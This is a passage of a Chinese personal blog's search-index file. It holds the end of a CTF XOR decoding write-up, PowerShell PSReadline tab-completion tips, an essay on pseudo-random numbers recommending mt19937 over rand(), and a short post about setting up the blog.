punctuation">,</span> <span class="token number">137</span><span class="token punctuation">,</span> <span class="token number">147</span><span class="token punctuation">,</span> <span class="token number">191</span><span class="token punctuation">,</span> <span class="token number">137</span><span class="token punctuation">,</span> <span class="token number">147</span><span class="token punctuation">,</span> <span class="token number">191</span><span class="token punctuation">,</span> <span class="token number">148</span><span class="token punctuation">,</span> <span class="token number">136</span><span class="token punctuation">,</span><span class="token number">133</span><span class="token punctuation">,</span> <span class="token number">191</span><span class="token punctuation">,</span> <span class="token number">134</span><span class="token punctuation">,</span> <span class="token number">140</span><span class="token punctuation">,</span> <span class="token number">129</span><span class="token punctuation">,</span> <span class="token number">135</span><span class="token punctuation">,</span> <span class="token number">191</span><span class="token punctuation">,</span> <span class="token number">65</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token function">end</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token function">begin</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>cout <span class="token operator">&lt;&lt;</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">64</span> <span class="token operator">^</span> <span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p></p><p>朴素地认为，把加号改成减号就好， ####这样做可以得到正确的答案，但是思路是绝对错误的但是此题通过之后才发现<code>+ -</code>的优先级比异或的高 就代表：在位运算下， <img src="https://googles.plus/images/loading.gif" data-original="https://i.loli.net/2021/11/08/XP7Btpnjs8odDQb.png"> 成立</p><h4 id="c的那位会来回翻转没有系数的话-偶数-次-xor-操作就可再用">c的那位会来回翻转，没有系数的话<strong>偶数</strong> 次 <em>XOR</em> 操作就可，再用</h4><p><img src="https://googles.plus/images/loading.gif" data-original="https://i.loli.net/2021/11/08/IqV1GEKXRx3ketS.png"></p><h4 id="约束撞位操作即可">约束“撞”位操作即可。</h4><p><strong>（这里可以把XOR理解为不会影响其他位的加法溢出）</strong>但需要说明的是需要括号内的条件防止操作进位破坏其他高位数据。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Crypto </tag>
            
            <tag> Java </tag>
            
            <tag> XOR </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PowerShell自动补全技巧</title>
      <link href="/2021/11/07/powershell-bu-quan-ji-qiao/"/>
      <url>/2021/11/07/powershell-bu-quan-ji-qiao/</url>
      
        <content type="html"><![CDATA[<h1 id="powershell自动补全技巧">PowerShell自动补全技巧</h1><p>在某次 <strong>PowerShell 6.x.x</strong>更新后，加入了自动补全（菜单）功能，减轻了我的痛苦，救赎了我的灵魂，我很感谢PS的开发者们。</p><h3 id="效果图片">效果图片</h3><p>命令历史补全</p><p><img src="https://googles.plus/images/loading.gif" data-original="/images/pshisoty_0.png"></p><p>补全菜单</p><p><img src="https://googles.plus/images/loading.gif" data-original="/images/pshisoty_1.png"></p><h3 id="具体使用">具体使用</h3><p>尝试如下几个命令</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">Set-PSReadlineKeyHandler</span> <span class="token operator">-</span>Key Tab <span class="token operator">-</span><span class="token keyword">Function</span> Complete<span class="token function">Set-PSReadlineKeyHandler</span> <span class="token operator">-</span>Key Tab <span class="token operator">-</span><span class="token keyword">Function</span> MenuComplete<span class="token function">Set-PSReadlineKeyHandler</span> <span class="token operator">-</span>Key UpArrow <span class="token operator">-</span><span class="token keyword">Function</span> HistorySearchBackward<span class="token function">Set-PSReadlineKeyHandler</span> <span class="token operator">-</span>Key DownArrow <span class="token operator">-</span><span class="token keyword">Function</span> HistorySearchForward<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>怎么样，是不是打开了新世界的大门。</p><p>但每次设置在终端关闭后就会失效，将其写入Profile就可以每次开启时自动启动</p><p>执行 <code>$PROFILE</code> 看配置文件位置。</p>]]></content>
      
      
      
        <tags>
            
            <tag> PowerShell </tag>
            
            <tag> 外观/效率优化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>真假随机数</title>
      <link href="/2021/11/07/zhen-jia-sui-ji-shu/"/>
      <url>/2021/11/07/zhen-jia-sui-ji-shu/</url>
      
        <content type="html"><![CDATA[<h1 id="真假随机数">真假随机数</h1><h2 id="绪言随机数和伪随机数">绪言：随机数和伪随机数</h2><h3 id="随机数">随机数</h3><blockquote><p>真正的随机数是使用物理现象产生的：比如掷钱币、骰子、转轮、使用电子元件的噪音、核裂变等等，这样的随机数发生器叫做物理性随机数发生器，它们的缺点是技术要求比较高。</p></blockquote><p>根据的定义可以看到，真随机数是依赖于物理随机数生成器的。使用较多的就是电子元件中的噪音等较为高级、复杂的物理过程来生成。使用物理性随机数发生器生成的真随机数，可以说是完美再现了生活中的真正的“随机”，也可以称为绝对的公平。</p><h3 id="伪随机数">伪随机数</h3><blockquote><p>真正意义上的随机数（或者随机事件）在某次产生过程中是按照实验过程中表现的分布概率随机产生的，其结果是不可预测的，是不可见的。而计算机中的随机函数是按照一定算法模拟产生的，其结果是确定的，是可见的。我们可以这样认为这个可预见的结果其出现的概率是100%。所以用计算机随机函数所产生的“随机数”并不随机，是伪随机数。</p></blockquote><p>从定义我们可以了解到，伪随机数其实是有规律的。只不过这个规律周期比较长，但还是可以预测的。主要原因就是伪随机数是计算机使用算法模拟出来的，这个过程并不涉及到物理过程，所以自然不可能具有真随机数的特性。</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">10</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>连续两次运行这个过程，结果是<strong>一样</strong>的。（程序简单，自行试验）这就是<strong>伪随机数！</strong>就好像是在系统中已经有了一个<code>0</code>~<code>RAND_MAX</code>的一个乱序序列，我们调用<code>rand()</code>的时候都是参照这个序列和随机种子的，这里没有设置随机种子，因此随机种子为<span class="math inline">\(1\)</span> ，当随机种子为 <span class="math inline">\(x\)</span> 的时候，我们可以根据这个随机种子 <span class="math inline">\(x\)</span> 来计算出一个随机数 <span class="math inline">\(f(x, m)\)</span> ，其中<span class="math inline">\(m\)</span>为这个序列中的伪随机数。如果随机种子是固定的，那么每次调用<code>rand()</code>依然可以计算出来了。</p><h3 id="随机种子">随机种子</h3><p>由上面我们就知道了，所谓随机数其实是伪随机数，所谓的‘伪’，意思是这些数其实是有规律的，只不过因为算法规律太复杂，很难看出来而已。</p><p>但是，再厉害的算法，如果没有一个初始值，它也不可能凭空造出一系列随机数来，我们说的种子就是这个初始值。</p><p><em>Random</em>随机数是这样生成的：我们将这套复杂的算法（是叫随机数生成器吧）看成一个黑盒，把我们准备好的种子扔进去，它会返给你两个东西，一个是你想要的随机数，另一个是保证能生成下一个随机数的新的种子，把新的种子放进黑盒，又得到一个新的随机数和一个新的种子，从此在生成随机数的路上越走越远。</p><h2 id="标程缺陷">标程缺陷</h2><h3 id="标程"><del>标</del>程</h3><p><img src="https://googles.plus/images/loading.gif" data-original="http://ctf.nefu.edu.cn:3000//uploads/upload_ac9f70358b2dc19fa0ced4f833f670eb.jpg"></p><blockquote><p>查阅VB官方文档https://docs.microsoft.com/zh-cn/office/vba/language/reference/user-interface-help/rnd-function</p></blockquote><p>后我们知道：</p><p>函数： <strong>Rnd</strong> [ (<em>Number</em>) ]</p><h3 id="返回值">返回值</h3><table><thead><tr class="header"><th style="text-align: center;">如果 Number 为</th><th style="text-align: left;">则 Rnd 生成</th></tr></thead><tbody><tr class="odd"><td style="text-align: center;">小于 0</td><td style="text-align: left;">每次使用相同的数字，将 Number 用作种子。</td></tr><tr class="even"><td style="text-align: center;">大于 0</td><td style="text-align: left;">伪随机序列中的下一个数字。</td></tr><tr class="odd"><td style="text-align: center;">等于 0</td><td style="text-align: left;">最近生成的数字。</td></tr><tr class="even"><td style="text-align: center;">未提供</td><td style="text-align: left;">伪随机序列中的下一个数字。</td></tr></tbody></table><p><strong>Number</strong> 的值 确定 <strong>Rnd</strong>如何生成伪随机数：</p><ul><li><p>对于任何给定的原始种子，由于对 Rnd函数的每个后续调用会将之前的数字用作序列中的下一个数字的种子，因此，将生成相同的数字序列。</p></li><li><p>在调用 Rnd 之前，请使用不带参数的 Randomize语句来通过基于系统计时器的种子初始化随机数字生成器。</p></li></ul><p>分析程序后，我们可以发现作者并未给<code>Rnd</code>传入任何种子参数。<em>VisualBasic</em>编译器<strong>会且只会</strong>从伪随机序列中输出元素，造成结果的偏差和重复，使分布结果<strong>严重偏离</strong>理想的随机分布。</p><div class="warning"><p>远比VB的Rnd随机数先进的线性同余方法、平方取中法，甚至是双椭圆曲线确定性随机比特生成器都<strong>远远不能</strong>生成范围内可接受的随机数。导致其被密码学与计算机深度学习界弃用。</p></div><h2 id="该怎么做">该怎么做？</h2><h3 id="什么是伪随机数生成器数学定义">什么是伪随机数生成器？——数学定义</h3><h3 id="给定">给定</h3><ul><li>$P$ - $\left(\mathbb{R},\mathfrak{B}\right)$上的概率分布，其中$\mathfrak{B}$是实数集上的 <em>Borel set</em></li><li>$\mathfrak{F}$ - 非空子集$\mathfrak{F}\subseteq\mathfrak{B}$，例如 $\mathfrak{F}=\left\{\left(-\infty,t\right] : t\in\mathbb{R}\right\}$</li><li>$A\subseteq\mathbb{R}$<ul><li>非空集合</li></ul></li></ul><p>称一个函数 $f:\mathbb{N}_1\rightarrow\mathbb{R}$（$\mathbb{N}_1=\left\{1,2,3,\dots\right\}$是正整数的一个子集）为一个伪随机生成器，当且仅当： - $f\left(\mathbb{N}_1\right)\subseteq A$ -$\forall E\in\mathfrak{F} \quad \forall 0&lt;\varepsilon\in\mathbb{R} \quad \exists N\in\mathbb{N}_1 \quad \forall N\leq n\in\mathbb{N}_1, \quad \left|\frac{\left\{\#i\in\left\{1,2,\dots, n\right\} : f(i)\in E\right\}}{n}-P(E)\right|&lt; \varepsilon$</p><h3 id="如何正确地生成一个随机数">如何正确地生成一个随机数</h3><p>在最近的一场CF的题解中，提到了这篇Blog:<a href="https://codeforces.com/blog/entry/61587">Don't use rand(): a guideto random number generators in C++</a></p><p>大概概述一下这篇神仙Blog说了啥：</p><ul><li>CF评测机上（以及我们会遭遇的许多Windows评测机上）<code>RAND_MAX</code>很小，只有<span class="math inline">\(32767\)</span></li><li>不幸的是，<code>random_shuffle</code>用的也是这个自带的rand()，元素在数组里移动的距离也很小。</li><li><code>rand()</code>使用的伪随机算法是 <strong>Linear CongruentialGenerator</strong> (线性同余发生器），在低位循环节很低。</li></ul><p>那么如何正确地生成一个随机数呢？神仙blog提供了这样一个东西：库里的<code>mt19937</code>。</p><p>这个奇葩的名字来自于它使用的算法——<strong>MersenneTwister</strong>算法，以及它用到的质数<span class="math inline">\(2^{19937}−1\)</span>。</p><p>怎么用呢？</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp">mt19937 <span class="token function">rng</span><span class="token punctuation">(</span>seed<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%u\n"</span><span class="token punctuation">,</span> <span class="token function">rng</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>上面那句相当于<code>srand(seed)</code>，然后调用你定义的<code>rng()</code>可以获得一个<code>unsigned int</code>类型的随机数。</p><p>如果你要生成 <code>unsigned long long</code>类型的话，使用<code>mt19937_64</code>即可。</p><p>那么怎么替代<code>random_shuffle()</code>呢？使用<code>shuffle()</code>函数，把你的<code>mt19937</code>传进去，像这样：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token function">shuffle</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> a <span class="token operator">+</span> n<span class="token punctuation">,</span> rng<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这样就能让数组内的元素移动足够大的距离——让<code>shuffle</code>更随机了。</p><p>附：完整生成随机数代码 </p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;cstdio&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;chrono&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;random&gt;</span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span>mt19937 <span class="token function">rng</span><span class="token punctuation">(</span>chrono<span class="token double-colon punctuation">::</span>steady_clock<span class="token double-colon punctuation">::</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">time_since_epoch</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%u\n"</span><span class="token punctuation">,</span> <span class="token function">rng</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre> ## 参考<p></p><ul><li><a href="https://www.cnblogs.com/RabbitHu/p/10390146.html">RabbitHu</a></li><li>Barker E., Kelsey J., <em>Recommendation for Random NumberGeneration Using Deterministic Random Bit Generators</em>, NISTSP800-90A, January 2012</li><li>Brent R.P., <em>"Some long-period random number generators usingshifts and xors"</em>, ANZIAM Journal, 2007; 48:C188–C202</li><li>Gentle J.E. (2003), <em>Random Number Generation and Monte CarloMethods</em>, Springer.</li><li>Hörmann W., Leydold J., Derflinger G. (2004, 2011), <em>AutomaticNonuniform Random Variate Generation</em>, Springer-Verlag.</li><li>Knuth D.E.. <em>The Art of Computer Programming, Volume 2:Seminumerical Algorithms, Third Edition. Addison-Wesley, 1997</em>. ISBN0-201-89684-2. Chapter 3.</li><li>Luby M., <em>Pseudorandomness and Cryptographic Applications,Princeton Univ Press, 1996</em>. ISBN 9780691025469</li><li>von Neumann J., <em>"Various techniques used in connection withrandom digits,"</em> in A.S. Householder, G.E. Forsythe, and H.H.Germond, eds., Monte Carlo Method, National Bureau of Standards AppliedMathematics Series, 12 (Washington, D.C.: U.S. Government PrintingOffice, 1951): 36-38.</li><li>Peterson, Ivars. <em>The Jungles of Randomness : a mathematicalsafari</em>. New York: John Wiley &amp; Sons. 1997. ISBN0-471-16449-6.</li><li>Press W.H., Teukolsky S.A., Vetterling W.T., Flannery B.P. (2007),<em>Numerical Recipes (Cambridge University Press)</em>.</li><li>Viega J., <em>"Practical Random Number Generation in Software"</em>,in Proc. 19th Annual Computer Security Applications Conference, Dec.2003.</li></ul><hr><h2 id="关于作者">关于作者</h2><p><strong>sfc9982</strong> <span class="math inline">\(from~nefu.\)</span> - QQ: 2120935182 - Telegram:<span class="citation" data-cites="sfc9982">@sfc9982</span> -Codeforce平台:sfc9982 - NEFU CTF平台: sfc9982</p><p>感谢您拨冗阅读这篇文章。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Math </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>0day</title>
      <link href="/2021/11/07/0day/"/>
      <url>/2021/11/07/0day/</url>
      
        <content type="html"><![CDATA[<p>2021.11.7 偶然想起 <strong>jjc</strong> 同志建个 <code>hexo</code>站的建议，遂配置，从中午弄到下午5点，中间吃了个饭，最后弄好了</p><p><code>好耶！</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> life </tag>
            
            <tag> blog </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
